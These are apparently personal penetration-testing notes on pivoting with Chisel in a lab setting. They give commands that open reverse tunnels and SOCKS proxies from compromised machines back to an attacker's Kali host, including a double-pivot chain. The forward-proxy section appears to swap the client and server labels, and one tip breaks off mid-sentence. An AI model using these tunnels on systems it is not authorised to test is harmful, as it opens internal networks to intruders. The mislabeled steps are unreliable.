### Remote port forwarding
Chisel as client:
```powershell
# Single Port
.\\chisel.exe client 10.10.16.4:1337 R:1433:localhost:1433
# All the ports
./chisel client 10.10.14.3:1234 R:127.0.0.1:socks
```
Examples:
[[Anubis#^e12b6c]]

Chisel as server:
```bash
./chisel server --port 1337 --reverse
```
Examples:

### Forward SOCKS Proxy
Chisel as client:
```bash
./chisel.sh server -p 2345 --socks5
```
Chisel as server:
```bash
./chisel_1.7.7_linux_amd64 client 10.10.11.107:2345 <PROXY_PORT>:socks
```
Additionally /etc/proxychains.conf file needs to be setted as follows:
```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 <PROXY_PORT>
```
Finally if this is an HTTP service we need to configure the foxyproxy with the port choosen:

### Double Pivoting

If there are two machines and we want to reach the second one fully with with double chisel, we need to upload a chisel and proceed to do the following commands:

1) On Kali Machine:
```bash
# For all the pivotings
./chisel server -p 1234 --reverse
```
> This server needs to be opened only once, and all the subsequent connections will be redirected towards this port.
{: .prompt-tip }

2) On first machine:
```powershell
# It needs to point to the Kali server:
./chisel client 10.10.14.3:1234 R:127.0.0.1:socks
```
> Since the port for the proxy is not specified, the socks proxy will be opened on port 1080 by default.
{: .prompt-tip }

3) On second machine:
```powershell
# It needs to point to the Kali server on different socks port:
./chisel client 10.10.14.3:1234 R:1081:socks
```
> For the second machine the second socks proxy port needs to be specified, it is worth mentioning that 
{: .prompt-tip }
